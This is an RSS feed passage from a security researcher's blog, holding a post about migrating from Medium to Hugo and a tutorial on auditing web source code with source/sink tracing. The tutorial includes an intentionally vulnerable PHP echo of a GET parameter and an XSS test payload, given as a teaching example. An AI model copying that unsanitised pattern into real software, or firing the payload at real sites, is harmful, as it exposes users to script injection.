<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Tutorial on Ally Petitt</title>
    <link>https://ally-petitt.com:443/en/tags/tutorial/</link>
    <description>Recent content in Tutorial on Ally Petitt</description>
    <generator>Hugo -- 0.128.0</generator>
    <language>en</language>
    <lastBuildDate>Fri, 03 May 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.com:443/en/tags/tutorial/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Goodbye World - Migrating Away From Medium | Graduation &amp; Next Steps</title>
      <link>https://ally-petitt.com:443/en/posts/2024-04-31_leaving-medium/</link>
      <pubDate>Fri, 03 May 2024 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2024-04-31_leaving-medium/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/Medium-crossed.png&#34; alt=&#34;Medium logo crossed out&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Hello everyone and welcome to the first exclusive post on my new personal website! I am very excited to be here and I hope that you are as well. The picture above is a bit dramatic, but communicates the message that I have decided to move forward. Those who have been following me will know that I first began my technical blog on Medium, which was an approachable outlet for sharing my knowledge as I first entered the field.&lt;/p&gt;
&lt;p&gt;I will graduate from high school this month, which marks the beginning of a new chapter in my life. In the spirit of this transitional period of my life, I decided to make the shift from posting my technical articles on Medium to this personal website.&lt;/p&gt;
&lt;p&gt;The technical details of how I migrated my blogs from Medium to here will be explained further down in this article.&lt;/p&gt;
&lt;h3 id=&#34;appreciation&#34;&gt;Appreciation&lt;/h3&gt;
&lt;p&gt;I want to first express my gratitude for Medium and the supportive readers that the platform has allowed me to connect with. Medium is where I got my start in writing technical blogs and has been an instrumental outlet in sharing my knowledge as I was learning it.&lt;/p&gt;
&lt;h2 id=&#34;why-im-leaving-medium&#34;&gt;Why I&amp;rsquo;m Leaving Medium&lt;/h2&gt;
&lt;p&gt;With that in mind, my decision to leave Medium is multi-faceted.&lt;/p&gt;
&lt;p&gt;Not only am I ascending into adulthood, I am maturing into a professional career doing work that I am extremely passionate about. I wanted that increased seriousness to be reflected in the articles that I write, which is more aptly served by a personal website than Medium (even more so with a custom domain, but that is a work in progress).&lt;/p&gt;
&lt;p&gt;Additionally, this website offers a more authentic experience. I have purposefully omitted analytics for the benefit of my readers&amp;rsquo; privacy. As a result, these posts are more like a conversation with interested readers than a numbers game.&lt;/p&gt;
&lt;p&gt;Finally, creating my own website affords me autonomy. My readers are no longer berated by banners and pop-ups to subscribe to get a Medium membership so that they can view other content on the site with the vast majority of it being pay-walled. I can provide my readers with a site that is free to access without distractions- something that I have come to appreciate in my own internet browsing.&lt;/p&gt;
&lt;p&gt;I also understand that I have readers that prefer stay updated with their authors through RSS feed aggregators. For you, I added an &lt;a href=&#34;https://ally-petitt.com/index.xml&#34;&gt;RSS feed&lt;/a&gt; to the site :).&lt;/p&gt;
&lt;h2 id=&#34;next-steps&#34;&gt;Next Steps&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.vanderbilt.edu/vu-wpfsx/wp-content/uploads/sites/7/2024/04/09234832/commencement-topper-Image-2024-scaled.jpeg&#34; alt=&#34;Picture of a graduation&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;I am excited about the future. I used to be petrified about life after graduation, but I have learned to embrace the unknown. There is so much to learn, attempt, and experience and I am at this exciting point in my life where it is all novel. There are certain topics in cybersecurity that I wish I could re-learn again for the first time because I remember the potent feelings awe and inspiration of the moment I first read about them. Here&amp;rsquo;s to a future of continued discovery.&lt;/p&gt;
&lt;p&gt;Regarding this blog, as I continue to perform security research and study new techniques, I plan to publish writeups or otherwise educational content. Writing will not be my main focus, so I will prioritize the articles I write based on what I find very interesting or if I think my audience would benefit from them.&lt;/p&gt;
&lt;h2 id=&#34;creating-this-website&#34;&gt;Creating This Website&lt;/h2&gt;
&lt;p&gt;I was recommended the static site generator, Hugo, by a colleague who I was discussing website-building with. After setting up a Hugo app, I found appreciation in the ease of setup and its customizability and decided to build this website to completion with it.&lt;/p&gt;
&lt;p&gt;Since there are already a plethora of tutorials for Hugo, I will omit the initial app setup (those that are interested can view Hugo&amp;rsquo;s &lt;a href=&#34;https://gohugo.io/getting-started/quick-start/&#34;&gt;QuickStart Guide&lt;/a&gt;). Instead, I will focus on the technical challenges that were specific to this use case of converting a personal Medium blog to a Hugo-compatible markdown post.&lt;/p&gt;
&lt;h3 id=&#34;how-i-transferred-previous-blog-posts&#34;&gt;How I Transferred Previous Blog Posts&lt;/h3&gt;
&lt;p&gt;I had 26 published blogs on my Medium account, so transferring each manually would have taken an immense amount of time. Consequently, I used scripts to automate this process. The first was a tool developed by Oliver Ernst called &lt;a href=&#34;https://github.com/smrfeld/medium-to-markdown&#34;&gt;medium-to-markdown&lt;/a&gt;. The second was a tool was developed by myself: &lt;a href=&#34;https://github.com/ally-petitt/medium-to-hugo-post&#34;&gt;medium-to-hugo-post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;My workflow involved chaining both of these scripts together such that the output directory of &lt;code&gt;medium-to-markdown&lt;/code&gt; was the input directory of &lt;code&gt;medium-to-hugo-post&lt;/code&gt; with &lt;code&gt;/md&lt;/code&gt; appended. As per the README instructions on &lt;code&gt;medium-to-markdown&lt;/code&gt;, I requested an export of my data from Medium, which I then fed into &lt;code&gt;medium-to-markdown&lt;/code&gt;. This converted my posts into markdown with the exception of image tags and their captions.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;medium&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;to&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;markdown&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;run&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py convert &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;posts&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dir &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;export&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;posts &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;output&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dir &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;output
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Following the markdown conversion, I noticed that the new markdown files required additional modifications to properly format on Hugo. To remedy this, I created &lt;code&gt;medium-to-hugo-post&lt;/code&gt; to add a &amp;ldquo;&lt;a href=&#34;https://gohugo.io/content-management/front-matter/&#34;&gt;Front Matter&lt;/a&gt;&amp;rdquo; to each post and finalize the conversion of images and their subtitles to markdown.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 ./medium-to-hugo-post/medium-to-hugo-post.py --md-dir ./output/md --posts-dir ./content/posts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I outline these steps and the limitations of these tools in more detail in the medium-to-hugo-post &lt;a href=&#34;https://github.com/ally-petitt/medium-to-hugo-post/blob/main/README.md&#34;&gt;README.md&lt;/a&gt; file.&lt;/p&gt;
&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;Migrating to this website is a symbol of a new beginning. I could not be more enthusiastic about this transformative period of my life as I transition into a full-time career doing the work that I love. Thank you to everyone who has supported me throughout this journey, and I can&amp;rsquo;t wait to see what the future has in store!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/Medium-crossed.png" alt="Medium logo crossed out"  />
</p>
<h2 id="introduction">Introduction</h2>
<p>Hello everyone and welcome to the first exclusive post on my new personal website! I am very excited to be here and I hope that you are as well. The picture above is a bit dramatic, but communicates the message that I have decided to move forward. Those who have been following me will know that I first began my technical blog on Medium, which was an approachable outlet for sharing my knowledge as I first entered the field.</p>
<p>I will graduate from high school this month, which marks the beginning of a new chapter in my life. In the spirit of this transitional period of my life, I decided to make the shift from posting my technical articles on Medium to this personal website.</p>
<p>The technical details of how I migrated my blogs from Medium to here will be explained further down in this article.</p>
<h3 id="appreciation">Appreciation</h3>
<p>I want to first express my gratitude for Medium and the supportive readers that the platform has allowed me to connect with. Medium is where I got my start in writing technical blogs and has been an instrumental outlet in sharing my knowledge as I was learning it.</p>
<h2 id="why-im-leaving-medium">Why I&rsquo;m Leaving Medium</h2>
<p>With that in mind, my decision to leave Medium is multi-faceted.</p>
<p>Not only am I ascending into adulthood, I am maturing into a professional career doing work that I am extremely passionate about. I wanted that increased seriousness to be reflected in the articles that I write, which is more aptly served by a personal website than Medium (even more so with a custom domain, but that is a work in progress).</p>
<p>Additionally, this website offers a more authentic experience. I have purposefully omitted analytics for the benefit of my readers&rsquo; privacy. As a result, these posts are more like a conversation with interested readers than a numbers game.</p>
<p>Finally, creating my own website affords me autonomy. My readers are no longer berated by banners and pop-ups to subscribe to get a Medium membership so that they can view other content on the site with the vast majority of it being pay-walled. I can provide my readers with a site that is free to access without distractions- something that I have come to appreciate in my own internet browsing.</p>
<p>I also understand that I have readers that prefer stay updated with their authors through RSS feed aggregators. For you, I added an <a href="https://ally-petitt.com/index.xml">RSS feed</a> to the site :).</p>
<h2 id="next-steps">Next Steps</h2>
<p><img loading="lazy" src="https://cdn.vanderbilt.edu/vu-wpfsx/wp-content/uploads/sites/7/2024/04/09234832/commencement-topper-Image-2024-scaled.jpeg" alt="Picture of a graduation"  />
</p>
<p>I am excited about the future. I used to be petrified about life after graduation, but I have learned to embrace the unknown. There is so much to learn, attempt, and experience and I am at this exciting point in my life where it is all novel. There are certain topics in cybersecurity that I wish I could re-learn again for the first time because I remember the potent feelings awe and inspiration of the moment I first read about them. Here&rsquo;s to a future of continued discovery.</p>
<p>Regarding this blog, as I continue to perform security research and study new techniques, I plan to publish writeups or otherwise educational content. Writing will not be my main focus, so I will prioritize the articles I write based on what I find very interesting or if I think my audience would benefit from them.</p>
<h2 id="creating-this-website">Creating This Website</h2>
<p>I was recommended the static site generator, Hugo, by a colleague who I was discussing website-building with. After setting up a Hugo app, I found appreciation in the ease of setup and its customizability and decided to build this website to completion with it.</p>
<p>Since there are already a plethora of tutorials for Hugo, I will omit the initial app setup (those that are interested can view Hugo&rsquo;s <a href="https://gohugo.io/getting-started/quick-start/">QuickStart Guide</a>). Instead, I will focus on the technical challenges that were specific to this use case of converting a personal Medium blog to a Hugo-compatible markdown post.</p>
<h3 id="how-i-transferred-previous-blog-posts">How I Transferred Previous Blog Posts</h3>
<p>I had 26 published blogs on my Medium account, so transferring each manually would have taken an immense amount of time. Consequently, I used scripts to automate this process. The first was a tool developed by Oliver Ernst called <a href="https://github.com/smrfeld/medium-to-markdown">medium-to-markdown</a>. The second was a tool was developed by myself: <a href="https://github.com/ally-petitt/medium-to-hugo-post">medium-to-hugo-post</a>.</p>
<p>My workflow involved chaining both of these scripts together such that the output directory of <code>medium-to-markdown</code> was the input directory of <code>medium-to-hugo-post</code> with <code>/md</code> appended. As per the README instructions on <code>medium-to-markdown</code>, I requested an export of my data from Medium, which I then fed into <code>medium-to-markdown</code>. This converted my posts into markdown with the exception of image tags and their captions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>medium<span style="color:#f92672">-</span>to<span style="color:#f92672">-</span>markdown<span style="color:#f92672">/</span>run<span style="color:#f92672">.</span>py convert <span style="color:#f92672">--</span>posts<span style="color:#f92672">-</span>dir <span style="color:#f92672">./</span><span style="color:#66d9ef">export</span><span style="color:#f92672">/</span>posts <span style="color:#f92672">--</span>output<span style="color:#f92672">-</span>dir <span style="color:#f92672">./</span>output
</span></span></code></pre></div><p>Following the markdown conversion, I noticed that the new markdown files required additional modifications to properly format on Hugo. To remedy this, I created <code>medium-to-hugo-post</code> to add a &ldquo;<a href="https://gohugo.io/content-management/front-matter/">Front Matter</a>&rdquo; to each post and finalize the conversion of images and their subtitles to markdown.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 ./medium-to-hugo-post/medium-to-hugo-post.py --md-dir ./output/md --posts-dir ./content/posts
</span></span></code></pre></div><p>I outline these steps and the limitations of these tools in more detail in the medium-to-hugo-post <a href="https://github.com/ally-petitt/medium-to-hugo-post/blob/main/README.md">README.md</a> file.</p>
<h3 id="conclusion">Conclusion</h3>
<p>Migrating to this website is a symbol of a new beginning. I could not be more enthusiastic about this transformative period of my life as I transition into a full-time career doing the work that I love. Thank you to everyone who has supported me throughout this journey, and I can&rsquo;t wait to see what the future has in store!</p>
]]></content:encoded>
    </item>
    <item>
      <title>How to Find more Vulnerabilities — Source Code Auditing Explained</title>
      <link>https://ally-petitt.com:443/en/posts/2024-01-01_how-to-find-more-vulnerabilities---source-code-auditing-explained-2c8a10896374/</link>
      <pubDate>Mon, 01 Jan 2024 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2024-01-01_how-to-find-more-vulnerabilities---source-code-auditing-explained-2c8a10896374/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*jDmBerRWYf3eZh2J&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Whitebox penetration testing can be intimidating. Complex web applications may contain hundreds of thousands of lines of code and deciphering the connection between the various web components and their numerous implementations is challenging. A powerful, yet simple technique to approach the code review of such an application is to break it into manageable pieces.&lt;/p&gt;
&lt;p&gt;In this article, I will be outlining a methodology that can be used to break down large web applications, such as Content Management Systems (CMSs) into manageable components that can be systematically analyzed for vulnerabilities or logic errors. This is the approach that I used to discover CVE-2023–43154 and it is the approach taught in the AWAE, OffSec’s prerequisite course to the OffSec Web Expert (OSWE) certification.&lt;/p&gt;
&lt;p&gt;Note that this article has an emphasis on web security, but the methodology can be applied to other fields of research as well.&lt;/p&gt;
&lt;p&gt;Let’s begin.&lt;/p&gt;
&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
&lt;p&gt;At a high level, this methodology begins with gaining familiarity with the application as a whole. This phase includes&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Identifying the technology stack — programming language, templating engine, database, etc..&lt;/li&gt;
&lt;li&gt;Mapping out the application to gain a high-level overview of the structure of the project — commands like &lt;code&gt;tree -L 3&lt;/code&gt; may be used.&lt;/li&gt;
&lt;li&gt;Reading documentation&lt;/li&gt;
&lt;li&gt;Understanding common use cases of the application&lt;/li&gt;
&lt;li&gt;Exploring the application through its interface&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These steps help to develop a holistic understanding of the application. This enables you to better relate your subsequent findings to how the application is used, aiding in a more accurate assessment of impact and the likelihood of a successful exploit.&lt;/p&gt;
&lt;p&gt;Then, the approach can branch into either of two directions: bottom-up or top-down. To understand what this means, it is first important to define what is meant by a “source” and a “sink”. From there, it will become more clear what is meant by the aforementioned approaches.&lt;/p&gt;
&lt;h2 id=&#34;sources-andsinks&#34;&gt;Sources and Sinks&lt;/h2&gt;
&lt;p&gt;Vulnerabilities in web applications commonly arise from the manner in which user input is handled. The entry point for user input is referred to as a source. An example of this would be input from a form, a query parameter in the URL, or a cookie. These are sources of user input that are then interpreted and handled by the web application.&lt;/p&gt;
&lt;p&gt;A sink, on the contrary, is where the user input is actually used. This is where the vulnerability occurs. In the case of a SQL injection, the source may be a query parameter that has contents concatenated with a SQL query.&lt;/p&gt;
&lt;p&gt;To further illustrate this point, I will provide an example. The vulnerable PHP code below has a source, &lt;code&gt;comment&lt;/code&gt; , and a sink, &lt;code&gt;&amp;lt;?php echo $_GET[‘comment’]; ?&amp;gt;&lt;/code&gt;. The lack of sanitization on the PHP code as it echos the user input results in an XSS vulnerability.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!-- Source: https://example.com/?comment=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; --&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;div id=&amp;#34;comment&amp;#34;&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;lt;!-- Sink --&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &amp;lt;?php echo $\_GET[&amp;#39;comment&amp;#39;]; ?&amp;gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For a more visual explanation, this &lt;a href=&#34;https://youtu.be/ZaOtY4i5w_U?si=zXfJBsNlhp4h-CLa&#34;&gt;LiveOverflow&lt;/a&gt; video provides an excellent demonstration of the topic.&lt;/p&gt;
&lt;h2 id=&#34;bottom-up-approach&#34;&gt;Bottom-Up Approach&lt;/h2&gt;
&lt;p&gt;The bottom-up approach refers to first locating sinks and tracing the code “upwards” to the source. For instance, I may search the code base for all occurrences of the sink &lt;code&gt;system()&lt;/code&gt;, and from there follow the value that is passed into the function to search for any user input that may be implemented into that parameter.&lt;/p&gt;
&lt;p&gt;Regular expressions are a common technique to speed up the process of finding sinks. Patterns such as &lt;code&gt;^.*unserialize\(.+\)&lt;/code&gt; may be used to locate specific sinks (in this case, the &lt;code&gt;unserialize()&lt;/code&gt; function) with more accuracy and can be used to narrow down the search effort. It is important to note, however, that this method has limitations. The regex results are only as strong as the pattern used and even well-established regular expressions can miss vulnerabilities and sinks.&lt;/p&gt;
&lt;p&gt;This method is generally more tedious since not all occurrences of a sink will be used in the context of user-controlled data. Therefore, there can be more code to parse through in order to find a bug. Despite its repetitiveness, this approach has the advantage of increasing the likelihood of finding &lt;strong&gt;higher severity and less accessible vulnerabilities&lt;/strong&gt; that are very difficult, if not impossible, to discover without access to the source code.&lt;/p&gt;
&lt;h2 id=&#34;top-down-approach&#34;&gt;Top-Down Approach&lt;/h2&gt;
&lt;p&gt;On the contrary, the top-down approach consists of identifying sources and following their implementation in the code until a sink is found. For instance, I may submit the string &lt;code&gt;“test”&lt;/code&gt; into a &lt;code&gt;EditProfile&lt;/code&gt; functionality on a website. A top-down approach would consist of finding where the &lt;code&gt;“test”&lt;/code&gt; string is received in the code and following the logic used on it until I locate its sink, or implementation, in a SQL query.&lt;/p&gt;
&lt;p&gt;Regular expressions can be used here as well. A basic example is &lt;code&gt;^.*?query&lt;/code&gt; to find query parameters. Regular expressions will typically become more complex depending on the specific context and the vulnerabilities that they are searching for.&lt;/p&gt;
&lt;p&gt;This approach excels in finding vulnerabilities that are &lt;strong&gt;more accessible, but typically less severe&lt;/strong&gt;. To clarify, high severity and high accessibility vulnerabilities can be discovered through either approach. One approach will simply increase your likelihood of finding a particular kind of vulnerability and the one that is chosen will depend on the individual priorities of the code review.&lt;/p&gt;
&lt;h2 id=&#34;functionality-based-approach&#34;&gt;Functionality-Based Approach&lt;/h2&gt;
&lt;p&gt;A different perspective on code review is breaking the application down into sections based on functionality. Instead of starting broad with all of the application’s sources or sinks and then narrowing down into a vulnerable one, this approach involves starting narrow with one functionality and learning how it works on a deeper level in order to search for vulnerabilities in that particular segment of the application.&lt;/p&gt;
&lt;p&gt;This approach is particularly useful when prioritizing certain types of vulnerabilities based on factors such as required authentication level. In this instance, one can curate a list of functionalities that can be used without authentication and analyze those for vulnerabilities. Prioritization is a useful tool when auditing large code bases to increase the chances of finding higher severity vulnerabilities or medium-low severity vulnerabilities that can more elegantly be chained together to result in a higher-severity attack.&lt;/p&gt;
&lt;h1 id=&#34;tooling&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*UPqLe8hb4dLd2h30&#34; alt=&#34;&#34;  /&gt;

Tooling&lt;/h1&gt;
&lt;p&gt;I previously mentioned that searching through the code with regular expressions can be used to quickly identify sources and sinks. In addition to this, tools such as Semgrep can also be used to grep for certain patterns in the code. Semgrep looks at the code as more than a text file. It develops and abstract syntax tree (AST) in order to better understand the semantics. This can lead to its recognition of a certain vulnerable pattern in code that a regex pattern would miss. On the other hand, both are only as strong as the way they were written and they can lead to many false positives.&lt;/p&gt;
&lt;p&gt;Static Application Security Testing (SAST) solutions can also aide in identifying vulnerabilities. &lt;a href=&#34;https://spectralops.io/&#34;&gt;SpectralOps&lt;/a&gt;, Checkmarx, and Veracode are all examples of SAST tools used by organizations. I have not tried any of these at the time of writing, so I can not recommend one with certainty. SAST tools are generally meant for use by developers in the CI/CD pipeline, but they can also be used by researchers.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The approach to static analysis that you use will impact the types of vulnerabilities that you are more likely and their likelihood of being exploitable. I encourage you to experiment with different approaches to static analysis and decide for yourself which methods work best for your goals. A mixed approach is quite common and even encouraged for best results.&lt;/p&gt;
&lt;p&gt;Happy hacking!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*jDmBerRWYf3eZh2J" alt=""  />

<em><a href="https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1">https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1</a></em></p>
<h1 id="introduction">Introduction</h1>
<p>Whitebox penetration testing can be intimidating. Complex web applications may contain hundreds of thousands of lines of code and deciphering the connection between the various web components and their numerous implementations is challenging. A powerful, yet simple technique to approach the code review of such an application is to break it into manageable pieces.</p>
<p>In this article, I will be outlining a methodology that can be used to break down large web applications, such as Content Management Systems (CMSs) into manageable components that can be systematically analyzed for vulnerabilities or logic errors. This is the approach that I used to discover CVE-2023–43154 and it is the approach taught in the AWAE, OffSec’s prerequisite course to the OffSec Web Expert (OSWE) certification.</p>
<p>Note that this article has an emphasis on web security, but the methodology can be applied to other fields of research as well.</p>
<p>Let’s begin.</p>
<h1 id="methodology">Methodology</h1>
<p>At a high level, this methodology begins with gaining familiarity with the application as a whole. This phase includes</p>
<ul>
<li>Identifying the technology stack — programming language, templating engine, database, etc..</li>
<li>Mapping out the application to gain a high-level overview of the structure of the project — commands like <code>tree -L 3</code> may be used.</li>
<li>Reading documentation</li>
<li>Understanding common use cases of the application</li>
<li>Exploring the application through its interface</li>
</ul>
<p>These steps help to develop a holistic understanding of the application. This enables you to better relate your subsequent findings to how the application is used, aiding in a more accurate assessment of impact and the likelihood of a successful exploit.</p>
<p>Then, the approach can branch into either of two directions: bottom-up or top-down. To understand what this means, it is first important to define what is meant by a “source” and a “sink”. From there, it will become more clear what is meant by the aforementioned approaches.</p>
<h2 id="sources-andsinks">Sources and Sinks</h2>
<p>Vulnerabilities in web applications commonly arise from the manner in which user input is handled. The entry point for user input is referred to as a source. An example of this would be input from a form, a query parameter in the URL, or a cookie. These are sources of user input that are then interpreted and handled by the web application.</p>
<p>A sink, on the contrary, is where the user input is actually used. This is where the vulnerability occurs. In the case of a SQL injection, the source may be a query parameter that has contents concatenated with a SQL query.</p>
<p>To further illustrate this point, I will provide an example. The vulnerable PHP code below has a source, <code>comment</code> , and a sink, <code>&lt;?php echo $_GET[‘comment’]; ?&gt;</code>. The lack of sanitization on the PHP code as it echos the user input results in an XSS vulnerability.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;!-- Source: https://example.com/?comment=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;  
</span></span><span style="display:flex;"><span>&lt;div id=&#34;comment&#34;&gt;  
</span></span><span style="display:flex;"><span> &lt;!-- Sink --&gt;  
</span></span><span style="display:flex;"><span> &lt;?php echo $\_GET[&#39;comment&#39;]; ?&gt;   
</span></span><span style="display:flex;"><span>&lt;/div&gt;
</span></span></code></pre></div><p>For a more visual explanation, this <a href="https://youtu.be/ZaOtY4i5w_U?si=zXfJBsNlhp4h-CLa">LiveOverflow</a> video provides an excellent demonstration of the topic.</p>
<h2 id="bottom-up-approach">Bottom-Up Approach</h2>
<p>The bottom-up approach refers to first locating sinks and tracing the code “upwards” to the source. For instance, I may search the code base for all occurrences of the sink <code>system()</code>, and from there follow the value that is passed into the function to search for any user input that may be implemented into that parameter.</p>
<p>Regular expressions are a common technique to speed up the process of finding sinks. Patterns such as <code>^.*unserialize\(.+\)</code> may be used to locate specific sinks (in this case, the <code>unserialize()</code> function) with more accuracy and can be used to narrow down the search effort. It is important to note, however, that this method has limitations. The regex results are only as strong as the pattern used and even well-established regular expressions can miss vulnerabilities and sinks.</p>
<p>This method is generally more tedious since not all occurrences of a sink will be used in the context of user-controlled data. Therefore, there can be more code to parse through in order to find a bug. Despite its repetitiveness, this approach has the advantage of increasing the likelihood of finding <strong>higher severity and less accessible vulnerabilities</strong> that are very difficult, if not impossible, to discover without access to the source code.</p>
<h2 id="top-down-approach">Top-Down Approach</h2>
<p>On the contrary, the top-down approach consists of identifying sources and following their implementation in the code until a sink is found. For instance, I may submit the string <code>“test”</code> into a <code>EditProfile</code> functionality on a website. A top-down approach would consist of finding where the <code>“test”</code> string is received in the code and following the logic used on it until I locate its sink, or implementation, in a SQL query.</p>
<p>Regular expressions can be used here as well. A basic example is <code>^.*?query</code> to find query parameters. Regular expressions will typically become more complex depending on the specific context and the vulnerabilities that they are searching for.</p>
<p>This approach excels in finding vulnerabilities that are <strong>more accessible, but typically less severe</strong>. To clarify, high severity and high accessibility vulnerabilities can be discovered through either approach. One approach will simply increase your likelihood of finding a particular kind of vulnerability and the one that is chosen will depend on the individual priorities of the code review.</p>
<h2 id="functionality-based-approach">Functionality-Based Approach</h2>
<p>A different perspective on code review is breaking the application down into sections based on functionality. Instead of starting broad with all of the application’s sources or sinks and then narrowing down into a vulnerable one, this approach involves starting narrow with one functionality and learning how it works on a deeper level in order to search for vulnerabilities in that particular segment of the application.</p>
<p>This approach is particularly useful when prioritizing certain types of vulnerabilities based on factors such as required authentication level. In this instance, one can curate a list of functionalities that can be used without authentication and analyze those for vulnerabilities. Prioritization is a useful tool when auditing large code bases to increase the chances of finding higher severity vulnerabilities or medium-low severity vulnerabilities that can more elegantly be chained together to result in a higher-severity attack.</p>
<h1 id="tooling"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*UPqLe8hb4dLd2h30" alt=""  />

Tooling</h1>
<p>I previously mentioned that searching through the code with regular expressions can be used to quickly identify sources and sinks. In addition to this, tools such as Semgrep can also be used to grep for certain patterns in the code. Semgrep looks at the code as more than a text file. It develops and abstract syntax tree (AST) in order to better understand the semantics. This can lead to its recognition of a certain vulnerable pattern in code that a regex pattern would miss. On the other hand, both are only as strong as the way they were written and they can lead to many false positives.</p>
<p>Static Application Security Testing (SAST) solutions can also aide in identifying vulnerabilities. <a href="https://spectralops.io/">SpectralOps</a>, Checkmarx, and Veracode are all examples of SAST tools used by organizations. I have not tried any of these at the time of writing, so I can not recommend one with certainty. SAST tools are generally meant for use by developers in the CI/CD pipeline, but they can also be used by researchers.</p>
<h1 id="conclusion">Conclusion</h1>
